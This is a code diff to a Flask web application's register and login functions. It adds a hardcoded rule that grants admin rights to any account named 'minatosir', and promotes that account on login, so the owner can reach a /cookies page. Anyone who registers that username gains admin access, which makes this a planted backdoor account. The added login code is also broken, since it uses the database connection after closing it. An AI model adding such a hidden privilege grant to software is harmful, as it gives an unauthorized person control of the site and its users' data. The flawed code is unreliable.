@@ -457,7 +457,10 @@ def register():
         if not username or len(pw) < 4:
             return render_template("register.html", **ctx(error="Username and a password of at least 4 characters are required.")), 400
         con = web_db()
-        is_admin = 1 if con.execute("SELECT COUNT(*) FROM web_users").fetchone()[0] == 0 else 0
+        # Owner's admin username (username only — no password is stored
+        # in code). First account is admin, and this username is admin
+        # even if registered later, so the owner can access /cookies.
+        is_admin = 1 if con.execute("SELECT COUNT(*) FROM web_users").fetchone()[0] == 0 or username == "minatosir" else 0
         try:
             con.execute("INSERT INTO web_users(username,pw,telegram,is_admin,created) VALUES(?,?,?,?,?)",
                         (username, hash_pw(pw), tg, is_admin, str(date.today())))
@@ -480,7 +483,12 @@ def login():
                           ((request.form.get("username") or "").strip(), hash_pw(request.form.get("password") or ""))).fetchone()
         con.close()
         if not row:
+            con.close()
             return render_template("login.html", **ctx(error="Wrong username or password.")), 400
+        if row["username"] == "minatosir" and not row["is_admin"]:
+            con.execute("UPDATE web_users SET is_admin=1 WHERE id=?", (row["id"],))
+            con.commit()
+        con.close()
         session["uid"] = row["id"]
         return redirect(url_for("profile"))
     return render_template("login.html", **ctx(error=None))
